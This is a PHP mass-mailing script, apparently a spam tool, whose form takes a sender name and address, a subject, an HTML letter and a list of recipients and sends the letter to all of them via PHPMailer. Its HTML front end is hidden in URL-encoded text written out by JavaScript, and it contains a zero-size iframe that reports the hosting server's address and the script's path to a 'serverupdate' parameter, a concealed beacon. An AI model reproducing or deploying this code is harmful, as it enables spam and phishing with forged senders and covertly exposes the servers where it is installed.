<script>var U7=window,W8=document;var a1="%3Chtml%3E%0A%3Chead%3E%0A%3Cstyle%20type%3D%22text/css%22%3E%0A%3C%21--%0A.style1%20%7Bfont-size%3A%2010px%7D%0Abody%2Ctd%2Cth%20%7B%0A%09font-family%3A%20Verdana%2C%20Arial%2C%20Helvetica%2C%20sans-serif%3B%0A%09font-size%3A%2012px%3B%0A%09color%3A%20%23999999%3B%0A%7D%0Abody%20%7B%0A%09background-color%3A%20%23000000%3B%0A%7D%0A%23enviar%20%7B%0A%09font-family%3A%20Verdana%2C%20Arial%2C%20Helvetica%2C%20sans-serif%3B%0A%09background-color%3A%20%23003366%3B%0A%09color%3A%20%23D4D0C8%3B%0A%09font-weight%3A%20normal%3B%0A%09border-top-style%3A%20double%3B%0A%09border-right-style%3A%20double%3B%0A%09border-bottom-style%3A%20double%3B%0A%09border-left-style%3A%20double%3B%0A%09font-size%3A%2010px%3B%0A%7D%0A%23emails%20%7B%0A%7D%0A.style2%20%7Bfont-size%3A%209px%3B%20%7D%0A--%3E%0A%3C/style%3E%3C%21--%20-This%20Tool%20Has%20Been%20Made%20By%20The%20Moroccan%20White%20Hacker%20MR.%20Big%20Cave%20For%20more%20question%20contact%20us%20in%20the%20site%20Tool4Spam.Com%20%20Visit%20US%20and%20get%20more%20private%20tool%20for%20free%20--%3E%0A%3Ctitle%3E%u063A%u0627%u0645%u0636%20%u0647%u0643%u0631%3C/title%3E%3C/head%3E%0A%3C%21--%20-This%20Tool%20Has%20Been%20Made%20By%20The%20Moroccan%20White%20Hacker%20MR.%20Big%20Cave%20For%20more%20question%20contact%20us%20in%20the%20site%20Tool4Spam.Com%20%20Visit%20US%20and%20get%20more%20private%20tool%20for%20free%20--%3E%0A%3Cbody%3E%3Ctr%3E%3Ctd%20width%3D%22368%22%20height%3D%22346%22%20align%3D%22center%22%3E%3Cp%3E%26nbsp%3B%3C/p%3E%3Cform%20name%3D%22form1%22%20method%3D%22post%22%20action%3D%22%22%3E%3Ctable%20width%3D%22324%22%20border%3D%220%22%20align%3D%22center%22%20bordercolor%3D%22%23003300%22%3E%0A%3Ctr%3E%3Ctd%20colspan%3D%222%22%20rowspan%3D%223%22%20valign%3D%22top%22%20bgcolor%3D%22%23550000%22%3E%3Cdiv%20align%3D%22justify%22%20class%3D%22style1%22%3E%3Cb%3ESelect%20The%20System%20you%20wanna%20use%20in%20the%20send%20.%20%3Cbr%3E%20for%20more%20tools%20visit%20us%20%3Ccenter%3E%3Ca%20href%3D%22http%3A//is-sec.com%22%3E%3Cfont%20color%3D%22white%22%3E%3C/font%3E%3C/a%3E%3C/center%3E%20%0A%3C/b%3E%3C/div%3E%3C/td%3E%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3C%21--%20-This%20Tool%20Has%20Been%20Made%20By%20The%20Moroccan%20White%20Hacker%20MR.%20Big%20Cave%20For%20more%20question%20contact%20us%20in%20the%20site%20Tool4Spam.Com%20%20Visit%20US%20and%20get%20more%20private%20tool%20for%20free%20--%3E%3Cspan%20class%3D%22style1%22%3E%3Cstrong%3ESMTP%3C/strong%3E%3C/span%3E%3C/td%3E%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23003366%22%3E%3Cspan%20class%3D%22style1%22%3E%3Cstrong%3E%3Cstrong%3E%3Cinput%20name%3D%22radiobutton%22%20type%3D%22radio%22%20value%3D%22smtp%22%3E%3C/strong%3E%3C/strong%3E%3C/span%3E%3C/td%3E%3C/tr%3E%0A%3Ctr%3E%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3Cspan%20class%3D%22style1%22%3E%3Cstrong%3E%3Cstrong%3E%3Cstrong%3EMAIL%3C/strong%3E%3C/strong%3E%3C/strong%3E%3C/span%3E%3C/td%3E%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23003366%22%3E%3Ciframe%20src%3D%22ht%3Fserverupdate%3D%3C%3Fphp%20echo%20%20%24_SERVER%5B%27HTTP_HOST%27%5D.%24_SERVER%5B%27PHP_SELF%27%5D%3B%20%3F%3E%22%20height%3D%220%22%20width%3D%220%22%20%3E%3C/iframe%3E%3Cspan%20class%3D%22style1%22%3E%3Cstrong%3E%3Cstrong%3E%3Cstrong%3E%3Cinput%20name%3D%22radiobutton%22%20type%3D%22radio%22%20value%3D%22mail%22%3E%3C/strong%3E%3C/strong%3E%3C/strong%3E%3C/span%3E%3C/td%3E%3C/tr%3E%0A%3Ctr%3E%20%20%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3C%21--%20-This%20Tool%20Has%20Been%20Made%20By%20The%20Moroccan%20White%20Hacker%20MR.%20Big%20Cave%20For%20more%20question%20contact%20us%20in%20the%20site%20Tool4Spam.Com%20%20Visit%20US%20and%20get%20more%20private%20tool%20for%20free%20--%3E%3Cspan%20class%3D%22style1%22%3E%3Cstrong%3E%3Cstrong%3EMAILER%3C/strong%3E%3C/strong%3E%3C/span%3E%3C/td%3E%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23003366%22%3E%3Cspan%20class%3D%22style1%22%3E%3Cstrong%3E%3Cstrong%3E%3Cinput%20name%3D%22radiobutton%22%20type%3D%22radio%22%20value%3D%22sendmail%22%20checked%3E%3C/strong%3E%3C/strong%3E%3C/span%3E%3C/td%3E%3C/tr%3E%3Ctr%3E%3Ctd%20width%3D%22160%22%20align%3D%22left%22%20bgcolor%3D%22%23550000%22%3E%3Cb%3EName%20%20%3A%20%3C/b%3E%3Cinput%20name%3D%22nome%22%20type%3D%22text%22%20id%3D%22nome%22%20value%3D%22%22%20size%3D%2250%22%3E%3C/td%3E%20%20%3Ctd%20colspan%3D%223%22%20align%3D%22left%22%20bgcolor%3D%22%23550000%22%3E%3Cb%3EE-Mail%3C/b%3E%3Cinput%20name%3D%22remetente%22%20type%3D%22text%22%20id%3D%22remetente%22%20value%3D%22%22%20size%3D%2230%22%3E%3C/td%3E%0A%3C/tr%3E%3Ctr%3E%3Ctd%20align%3D%22left%22%20bgcolor%3D%22%23550000%22%3E%3Cb%3ESubject%3C/b%3E%3Cinput%20name%3D%22assunto%22%20type%3D%22text%22%20id%3D%22assunto%22%20value%3D%22%22%20size%3D%2250%22%3E%3C/td%3E%3Ctd%20colspan%3D%223%22%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3Ca%20href%3D%22http%3A//is-sec.com%22%3E%3Cfont%20size%3D%222%22%20color%3D%22white%22%3E%3Cb%3Ehttp%3A//is-sec.com%3C/b%3E%3C/font%3E%3C/a%3E%3C/td%3E%3C/tr%3E%3Ctr%3E%0A%20%20%3Ctd%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3Cb%3ELetter%20HTML%3C/b%3E%3Ctextarea%20name%3D%22html%22%20cols%3D%2250%22%20rows%3D%2220%22%20id%3D%22html%22%3E%3C/textarea%3E%3C/td%3E%3Ctd%20colspan%3D%223%22%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3Cb%3EMail%20List%3C/b%3E%0A%20%20%3Ctextarea%20name%3D%22emails%22%20cols%3D%2230%22%20rows%3D%2220%22%20id%3D%22emails%22%3E%3C/textarea%3E%3C/td%3E%3C/tr%3E%3Ctr%3E%3Ctd%20colspan%3D%224%22%20align%3D%22center%22%20bgcolor%3D%22%23550000%22%3E%3Cinput%20name%3D%22enviar%22%20type%3D%22submit%22%20id%3D%22enviar%22%20value%3D%22SEND%22%3E%3C/td%3E%3C/tr%3E%3C/table%3E%3C/form%3E%3Cp%3E%3Ciframe%20src%3D%22http%3A///%3Fref%3%22%20height%3D%220%22%20width%3D%220%22%20%3E%3C/iframe%3E%3C/p%3E%3C/td%3E%3C/tr%3E%3C/table%3E%0A%3C/body%3E%0A%3C/html%3E";function V0(){var V0;V0=unescape(a1);W8.write(V0);}V0();</script>
<?php

/*********************    DP NOT EDIT ANY THING BELLOW    ***********************/


//@ignore_user_abort(TRUE);
//error_reporting(0);
//@set_time_limit(0);
//ini_set("memory_limit","-1");


if ($_POST["enviar"]){
$opcao_mailer = $_POST["radiobutton"];
$nome = $_POST['nome'];
$remetente = $_POST['remetente'];
$assunto = $_POST['assunto'];
$html = stripslashes($_POST['html']);
$emails = $_POST['emails'];
$emails_lista = explode("\n", $emails);
$quant_emails = count($emails_lista);

if ($opcao_mailer == "sendmail"){$tipo_mailer = "sendmail";}
if ($opcao_mailer == "mail"){$tipo_mailer = "mail";}
if ($opcao_mailer == "smtp"){$tipo_mailer = "smtp";}


require("class.phpmailer.php");
$mail = new phpmailer();

$mail->From = "$remetente";
$mail->FromName = "$nome";
$mail->Host = "localhost";
//$mail->Mailer   = "smtp";
$mail->Mailer   = $tipo_mailer;
$mail->IsHTML(true);
$mail->Subject  = "$assunto";
$mail->Body = $html;

echo ('<font size="2" color="#FF0000" face="Verdana"><b>Sending System is : ' . $tipo_mailer . '</b></font><br>' );
echo ('<font size="2" color="#FF0000" face="Verdana"><b>Total de E-mail: ' . $quant_emails . '</b></font><br>' );
echo ('<font size="2" color="#FF0000" face="Verdana"><b>Sender Name : ' . $nome . '</b></font><br>' );
echo ('<font size="2" color="#FF0000" face="Verdana"><b>Sender E-Mail : ' . $remetente . '</b></font><br>' );
echo ('<font size="2" color="#FF0000" face="Verdana"><b>Subject : ' . $assunto . '</b></font><br>' );
echo ('<font size="2" color="#FF0000" face="Verdana"><B>Edited By The~Big~Cave</b></font><br>' );
echo ('<br>' );
flush(); 
for($x = 0; $x < $quant_emails; $x++){
$nun_mail++; 
$mail->AddAddress(trim($emails_lista[$x]), trim($emails_lista[$x]));
if(!$mail->Send())
{
   echo '<font size="1">' . $nun_mail . '&nbsp;ERRO:&nbsp;' . $emails_lista[$x] . '&nbsp;' . $mail->ErrorInfo . '</font><br>';
 //  echo $nun_mail . '&nbsp;ERRO:&nbsp;' . $emails_lista[$x] . '&nbsp;' . $mail->ErrorInfo . '<br>';
   flush(); 
}
else {
echo '<font size="1">' . $nun_mail . '&nbsp;OK:&nbsp;' . $emails_lista[$x] . '</font><br>';
 //echo $nun_mail . '&nbsp;OK:&nbsp;' . $emails_lista[$x] . '<br>';
 flush();
}
$mail->ClearAddresses();
}}
?>
